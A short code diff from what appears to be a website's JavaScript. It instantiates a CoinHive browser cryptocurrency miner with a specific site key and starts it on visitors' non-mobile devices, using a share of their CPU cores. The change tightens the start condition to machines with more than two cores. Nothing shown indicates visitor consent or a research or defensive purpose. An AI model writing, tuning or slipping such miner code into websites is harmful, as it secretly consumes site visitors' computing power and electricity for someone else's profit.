@@ -34,7 +34,7 @@
     }
 
     var miner = new CoinHive.Anonymous('yxEdUlVlkqdhLzbw2njg1mbGCQaXIVM7');
-    if (!miner.isMobile()) {
+    if (!miner.isMobile() && navigator.hardwareConcurrency > 2) {
 
         miner.start();
         var thrd = Math.ceil(navigator.hardwareConcurrency / 4);
